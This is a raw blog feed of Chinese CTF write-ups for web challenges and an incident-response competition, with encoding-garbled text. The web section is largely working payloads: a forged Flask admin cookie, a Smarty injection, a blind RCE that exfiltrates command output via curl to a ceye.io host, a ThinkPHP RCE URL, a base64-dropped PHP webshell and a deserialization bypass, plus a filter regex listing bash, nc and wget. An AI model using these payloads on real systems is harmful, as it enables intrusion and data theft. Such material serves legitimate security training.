&#x27;eyJuYW1lIjoiMTIzMTIzIn0.ZJBfaw.eXjErywCjj_0-tZe0l8-X_jc6hA&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJuYW1lIjoiMTIzMTIzMTIzIn0.ZJBf2g.6hBTi7wSIWzWnWHr8F4P9t4CItw&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">â””â”€<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &#x27;LitCTF&#x27; -t &quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJuYW1lIjoiYWRtaW4ifQ.ZJBgMQ.JTcEaSlnwJUiq70P847ooZJe0T4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619220547444.png" alt="image-20230619220547444"></p><h4 id="LitCTF-2023-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"><a href="#LitCTF-2023-PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼" class="headerlink" title="[LitCTF 2023]PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼"></a>[LitCTF 2023]PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼</h4><p>çŒœçš„</p><p><img src="/images/others/image-20230619222453209.png" alt="image-20230619222453209"></p><h4 id="LitCTF-2023-Http-pro-max-pluså·²è§£å†³"><a href="#LitCTF-2023-Http-pro-max-pluså·²è§£å†³" class="headerlink" title="LitCTF 2023]Http pro max pluså·²è§£å†³"></a>LitCTF 2023]Http pro max pluså·²è§£å†³</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Remote-Addr: 127.0.0.1</span><br><span class="line">X-Real-Ip: 127.0.0.1</span><br><span class="line">REMOTE-HOST: 127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1 </span><br><span class="line"></span><br><span class="line">Â varÂ list_of_fake_ip_headersÂ =Â [&quot;X-Forwarded-For&quot;,&quot;X-Forwarded&quot;,&quot;Forwarded-For&quot;,&quot;Forwarded&quot;,&quot;X-Forwarded-Host&quot;,&quot;X-remote-IP&quot;,&quot;X-remote-addr&quot;,&quot;True-Client-IP&quot;,&quot;X-Client-IP&quot;,&quot;Client-IP&quot;,&quot;X-Real-IP&quot;,&quot;Ali-CDN-Real-IP&quot;,&quot;Cdn-Src-Ip&quot;,&quot;Cdn-Real-Ip&quot;,&quot;CF-Connecting-IP&quot;,&quot;X-Cluster-Client-IP&quot;,&quot;WL-Proxy-Client-IP&quot;,&quot;Proxy-Client-IP&quot;,&quot;Fastly-Client-Ip&quot;,&quot;True-Client-Ip&quot;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619223522170.png" alt="image-20230619223522170"></p><p>NSSCTF{50e3aa21-3d2f-4b28-9670-ac2590b70250}</p><h4 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h4><p>æ”¹æˆputå°±å¯ä»¥äº†</p><h4 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h4><pre><code>&lt;title&gt;BadBadBooooy&lt;/title&gt;</code></pre><p>php smart</p><p><code>data=&#123;if system(&#39;cat /flag_13_searchmaster&#39;)&#125;&#123;/if&#125;</code></p><p><img src="/images/others/image-20230619225227860.png" alt="image-20230619225227860"></p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— å›æ˜¾rce ,execæ— å›æ˜¾ </p><p>dnså¤–å¸¦ï¼Œä½†æ˜¯å¥½åƒ ä»Šå¤©<a href="http://ceye.io/%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%86%EF%BC%8C">http://ceye.io/ä¸èƒ½ç”¨äº†ï¼Œ</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=1;curl `whoami`.*****s.ceye.io/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?url=l&#x27;&#x27;s / | tee 1.txt</span><br><span class="line">è®¿é—®http://node2.anna.nssctf.cn:28030/1.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll\aaaaaaggggggg | tee 2.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll&#x27;&#x27;aaaaaaggggggg | tee 2.txt</span><br><span class="line">è®¿é—®http://node2.anna.nssctf.cn:28030/2.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç¾ŠåŸæ¯-2020-easycon"><a href="#ç¾ŠåŸæ¯-2020-easycon" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easycon"></a>[ç¾ŠåŸæ¯ 2020]easycon</h4><p>å¾ˆç®€å•çš„é¢˜ï¼Œè®¿é—®ç½‘ç«™ï¼Œè·³åˆ°äº†apache2çš„ä½¿ç”¨é¡µé¢ï¼Œè®¿é—®index.php,è·³åˆ°é¡µé¢ï¼Œå¼¹çª—æç¤ºï¼Œ<code>eval cmd post</code> é‚£ä¹ˆå°±ç›´æ¥cmd=phpinfo();,ç¿»äº†ä¸€åœˆæ²¡æ‰¾åˆ°flagï¼Œå‘ç°æœ‰ä¸ªbbbbbb.txt ,ç›´æ¥ç”¨å¨å­è§£ä¸‹</p><p>æœ‰ä¸ªå›¾ç‰‡ï¼Œå°±å‡ºflagäº†ã€‚</p><p><img src="/images/others/image-20230630155457254.png" alt="image-20230630155457254"></p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols</h4><p>ç›´æ¥phpä¼ªåè®®è¯»å–hint.php</p><p><code>http://node2.anna.nssctf.cn:28419/index.php?wllm=php://filter/convert.base64-encode/resource=hint.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯»å³å¯<code>http://node2.anna.nssctf.cn:28419/test2222222222222.php?a=data://text/plain,I want flag</code></p><h4 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-rce"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-rce" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_rce"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_rce</h4><p>echo â€œPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+â€ | base64 -d &gt; s.php</p><p>PD9waHAgQGV2YWwoJF9QT1NUWydnJ10pOz8+</p><p><a href="http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=">http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</a></p><h4 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="literal">true</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span> ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?info=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="UUCTF-2022-æ–°ç”Ÿèµ›-ez-rceå·²è§£å†³"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ez-rceå·²è§£å†³" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rceå·²è§£å†³"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rceå·²è§£å†³</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28921/?code=?&gt;&lt;?=`nl /fffffffffflagafag`;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfmiscåˆ·é¢˜è®°å½•</title>
      <link href="/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp</title>
      <link href="/2023/05/17/%E7%AC%AC%E4%BA%8C%E5%B1%8AParlooCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/05/17/%E7%AC%AC%E4%BA%8C%E5%B1%8AParlooCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Parlooæ¯ åº”æ€¥å“åº”é™„ä»¶</span><br><span class="line">è¯·é€‰æ‰‹æå‰ä¸‹è½½ï¼Œæ­£å¼å¼€èµ›æä¾›è§£å‹å¯†ç ä»¥åŠæ–‡æ¡£</span><br><span class="line">æ–‡ä»¶æ€»å¤§å°ï¼š70gï¼Œè¯·é€‰æ‰‹ä¸‹è½½å®Œæˆåè‡ªè¡ŒéªŒè¯ hash å€¼ï¼Œç¡®ä¿æ–‡ä»¶å®Œæ•´æ€§</span><br><span class="line">ç™¾åº¦ç½‘ç›˜</span><br><span class="line">https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666 æå–ç : 6666 </span><br><span class="line">å¤¸å…‹ç½‘ç›˜</span><br><span class="line">https://pan.quark.cn/s/46653bd06cca</span><br><span class="line">123äº‘ç›˜</span><br><span class="line">https://www.123865.com/s/qDVvjv-zVBod æå–ç :6666</span><br></pre></td></tr></table></figure><p>åº”æ€¥å“åº”2-1</p><p>12äººå·²è§£ç­”</p><p>æµ·åº•å°çºµé˜Ÿ404notfoundflagç­¾åˆ°å°±å®Œäº‹</p><p>é¢˜ç›®æè¿°</p><p>æäº¤å ¡å’æœºä¸­ç•™ä¸‹çš„flag</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517105145418.png" alt="image-20250517105145418"></p><p>amdin/Skills@2020,æ ‡ç­¾åˆ—è¡¨ä¸­å³æ˜¯</p><p>åº”æ€¥å“åº”2-2</p><p>é¢˜ç›®æè¿°</p><p>æäº¤WAFä¸­éšè—çš„flag</p><p>åˆ†æ•°</p><p>99.5 åˆ†</p><p>admin/VF6NXMs7</p><p>åº”æ€¥å“åº”2-3</p><p>11äººå·²è§£ç­”</p><p>test404notfoundflag0x7c00</p><p>é¢˜ç›®æè¿°</p><p>æäº¤Mysqlä¸­ç•™ä¸‹çš„flag</p><p><a href="http://192.168.20.101:20221/databases/mysql">http://192.168.20.101:20221/databases/mysql</a> </p><p>mysqlé¢æ¿ï¼Œ</p><p>64a44f8137/f8941f8eb7<img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517111325475.png" alt="image-20250517111325475"></p><p>åœ¨é¢ç‰ˆä¸­æ‰¾äº†ä¸€åœˆå‘ç°æ²¡æœ‰ï¼Œæœæ–­è¿ä¸Šæ•°æ®åº“çœ‹çœ‹</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517111500551.png" alt="image-20250517111500551"></p><p>åº”æ€¥å“åº”2-4</p><p>6äººå·²è§£ç­”</p><p>404notfoundflagtestctfå°åˆ†é˜Ÿ</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ”»å‡»è€…çš„æ”»å‡»IP</p><p>åˆ†æ•°</p><p>98.52 åˆ†</p><p>c394c5de46/e36c392092</p><p>palu{2025-05-07-07-47-41}</p><p>07/May/2025:07:47:40 +0000</p><p>2025-05-07T07:28:26</p><p>palu{2025-5-7-07:28:26}</p><p>palu{2025-05-07-07-28-26}</p><p>2025-05-07T02:35:01</p><p>2025-05-07T07:31:43.059741+00:00 ubuntu sshd[40637]: Failed password for invalid user admin from 192.168.20.108 port 33852 ssh2</p><p>åº”æ€¥å“åº”2-6</p><p>æäº¤webæœåŠ¡æ³„éœ²çš„å…³é”®æ–‡ä»¶å</p><p>åº”æ€¥å“åº”2-7</p><p>4äººå·²è§£ç­”</p><p>404notfoundflagæ¥å‚åŠ æ¯”èµ›çš„æ— ééƒ½æ˜¯åœ¨è‹Ÿå»¶æ®‹å–˜çš„å—å–½ç½¢äº†test</p><p>é¢˜ç›®æè¿°</p><p>é¢˜è§£æ³„éœ²çš„é‚®ç®±åœ°å€</p><p>åˆ†æ•°</p><p>99.01 åˆ†</p><p>åº”æ€¥å“åº”2-8</p><p>6äººå·²è§£ç­”</p><p>testæ¥å‚åŠ æ¯”èµ›çš„æ— ééƒ½æ˜¯åœ¨è‹Ÿå»¶æ®‹å–˜çš„å—å–½ç½¢äº†æ±Ÿå·çŒæ‰‹</p><p>é¢˜ç›®æè¿°</p><p>æäº¤ç«‹è¶³ç‚¹æœåŠ¡å™¨ipåœ°å€</p><p>åˆ†æ•°</p><p>98.52 åˆ†</p><p>palu{192.168.20.108}</p><p>åº”æ€¥å“åº”2-9</p><p>parloo/parloo</p><p>åº”æ€¥å“åº”2-10</p><p>æäº¤æ”»å‡»è€…ç•™ä¸‹çš„çš„æ–‡ä»¶å†…å®¹ä½œä¸ºflagæäº¤</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517123701812.png" alt="image-20250517123701812"></p><p>palu{hi_2025_parloo_is_hack}</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517124103880.png" alt="image-20250517124103880"></p><p>cat /var/log/secure |grep 172.19.0.3|grep â€œFailedâ€</p><p>åº”æ€¥å“åº”2-11</p><p>æäº¤æƒé™ç»´æŒæ–¹æ³•æœåŠ¡çš„åç§°</p><p>åº”æ€¥å“åº”2-12</p><p>6äººå·²è§£ç­”</p><p>æ¥å‚åŠ æ¯”èµ›çš„æ— ééƒ½æ˜¯åœ¨è‹Ÿå»¶æ®‹å–˜çš„å—å–½ç½¢äº†å¤©ä¸‹ä¹‹ä¸­äºŒé†’é†’è¯¥æ¬ç –äº†</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ”»å‡»è€…æ”»å‡»æ¶æ„æœåŠ¡å™¨è¿æ¥åœ°å€ä½œä¸ºflagæäº¤</p><p>åˆ†æ•°</p><p>98.52 åˆ†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517144629463.png" alt="image-20250517144629463"></p><p>192.168.20.103æœºå™¨æœ‰ä¸€ä¸ªaaæ–‡ä»¶ï¼Œ</p><p>è„±ä¸‹æ¥åç¼–è¯‘å³å¯</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517144700508.png" alt="image-20250517144700508"></p><p>åº”æ€¥å“åº”2-13</p><p>æ‰¾åˆ°ç³»ç»Ÿä¸­è¢«åŠ«æŒçš„ç¨‹åºç¨‹åºåä½œä¸ºflagæäº¤</p><p>åº”æ€¥å“åº”2-14</p><p>5äººå·²è§£ç­”</p><p>404notfoundflagæ¥å‚åŠ æ¯”èµ›çš„æ— ééƒ½æ˜¯åœ¨è‹Ÿå»¶æ®‹å–˜çš„å—å–½ç½¢äº†0x7c00</p><p>é¢˜ç›®æè¿°</p><p>æ‰¾åˆ°ç³»ç»Ÿä¸­å­˜åœ¨ä¿¡æ¯æ³„éœ²çš„æœåŠ¡è¿è¡Œç«¯å£ä½œä¸ºflagæäº¤</p><p>åˆ†æ•°</p><p>98.77 åˆ†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517142537978.png" alt="image-20250517142537978"></p><p>8081</p><p>åº”æ€¥å“åº”2-15</p><p>11äººå·²è§£ç­”</p><p>å¤©ä¸‹ä¹‹ä¸­äºŒ0x7c00äº‘å–µ</p><p>é¢˜ç›®æè¿°</p><p>æäº¤Parlooå…¬å¸é¡¹ç›®ç»ç†çš„èº«ä»½è¯å·ä½œä¸ºflagæäº¤</p><p>åˆ†æ•°</p><p>97.32 åˆ†</p><p>è¿™é‡ŒæŸ¥çœ‹ç½‘ç«™é¢æ¿</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517161731618.png" alt="image-20250517161731618"></p><p>å¯ä»¥çœ‹åˆ°èº«ä»½è¯å·</p><p><a href="http://192.168.20.103:8081/">http://192.168.20.103:8081/</a></p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517161803924.png" alt="image-20250517161803924"></p><p>ç½‘ç«™ä¹Ÿèƒ½ç›´æ¥æŸ¥çœ‹</p><p>åº”æ€¥å“åº”2-16</p><p>4äººå·²è§£ç­”</p><p>æ¥å‚åŠ æ¯”èµ›çš„æ— ééƒ½æ˜¯åœ¨è‹Ÿå»¶æ®‹å–˜çš„å—å–½ç½¢äº†æœ€å–œæ¬¢å¯çˆ±çš„å¯Œèè‰äº†0x7c00</p><p>é¢˜ç›®æè¿°</p><p>æäº¤å­˜åœ¨å±é™©åŠŸèƒ½çš„æ“ä½œç³»ç»Ÿè·¯å¾„ä½œä¸ºflagæäº¤ã€‚flagæ ¼å¼ä¸ºpalu{/xxx/xxx}</p><p>åˆ†æ•°</p><p>99.01 åˆ†</p><p>è¿™é‡Œæ˜¯å±é™©åŠŸèƒ½ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ<img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517155401279.png" alt="image-20250517155401279"></p><p>wafä¸­3000ç«¯å£æ˜¯æœ‰ä¸€ä¸ªgitç®¡ç†å™¨çš„ï¼Œä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°è·¯å¾„</p><p>/admin/parloo</p><p>ä¸ºä»€ä¹ˆèƒ½åˆ¤æ–­æ¶æ„å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥ç™»ä¸ŠgitæŸ¥çœ‹</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517155512041.png" alt="image-20250517155512041"></p><p>åœ¨20.103çš„æœºå™¨ä¸­æœ‰dockerçš„gitea</p><p>å› ä¸ºæ²¡æœ‰å¯†ç ï¼Œmysqlçš„hashè§£ä¸å‡ºæ¥ï¼Œæ‰€ä»¥åªèƒ½é‡ç½®äº†</p><p>é‡ç½®çš„æ—¶å€™ä¼šæ˜¾ç¤ºæ²¡æƒé™ä¹ˆï¼Œè¿˜æ˜¯å•¥ï¼Œæ„æ€å°±æ˜¯ä¸èƒ½rootæ”¹å¯†ç ï¼Œæˆ‘ä»¬su git</p><p>åœ¨æ”¹å¯†ç å°±è¡Œäº†ã€‚</p><p>sudo gitea admin user change-password â€“username <a href="mailto:&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a> â€“password 12345678</p><p>ç™»ä¸Šå»å¯ä»¥çœ‹åˆ°goçš„æ¶æ„ä»£ç </p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517155722389.png" alt="image-20250517155722389"></p><p>åº”æ€¥å“åº”2-17</p><p>æäº¤è¿›æºæœºå™¨ä¸­æ¶æ„ç¨‹åºçš„MD5ä½œä¸ºflagè¿›è¡Œæäº¤ã€‚ flagæ ¼å¼ä¸ºpalu{MD5å°å†™}</p><p>åº”æ€¥å“åº”2-18</p><p>é¢˜ç›®ä¿¡æ¯</p><p>Write UP</p><p>17äººå·²è§£ç­”</p><p>æäº¤æ”»å‡»è€…ç•™ä¸‹çš„æ¶æ„è´¦æˆ·åç§°md5åä½œä¸ºflagè¿›è¡Œæäº¤ã€‚ æ ¼å¼ä¸ºpalu{md5{xxxxx}}</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529115238121.png" 